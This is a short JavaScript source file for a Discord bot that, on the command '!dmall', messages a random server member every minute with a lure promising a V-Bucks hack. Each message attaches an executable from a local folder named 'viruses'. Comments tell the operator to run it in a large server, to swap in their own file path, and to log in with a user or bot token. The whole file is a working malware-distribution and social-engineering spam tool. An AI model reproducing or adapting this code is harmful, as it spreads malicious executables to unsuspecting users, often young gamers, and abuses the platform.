const Discord = require('discord.js'); //recomand discord.js version 11.5.0
const client = new Discord.Client();


client.on("ready", () => {
console.log("Made by RobinD3l");
 //change if you want 
});

//message sender

client.on("message", (message) => {

    var authors = message.author

    //do !dmall in the #general of a big server where the bot is in!
    if(message.content === "!dmall") {

        //displays the guy who did !dmall
        console.log("Command started by ID: " + authors)
    
    try {
        (function(){

            //gets random user from the channel
            var user = message.guild.members.random();
            //
            console.log(`sending to ` + `${user.user}`);


            //dont add more than 4 Lines
            //the "user" variable is where the @user mention is
            user.sendMessage("Hi " + authors + " Please execute my new vbuck hack your now beta tester", {
                files: [
    
                  "C:\\VisualStudio\\source\\viruses\\stackoverflowvirus\runpls.exe" //change to the filepath
                ]
              });
            //user.sendMessage("did you run it?");
            //user.sendMessage("okay?");

            setTimeout(arguments.callee, 60000); //delay recommend change
        })();
    }
                 catch (e) {
                console.log("sending to " + user + " failed failed")
    
    }
  }});

//enter User or Bot Token
//if it says INVALID TOKEN at user tokens install discord.js version 11.5.0 or simmillar see important.txt
client.login("XXXXXXXXXXXXXXXXXXXXXXXXXXXXX");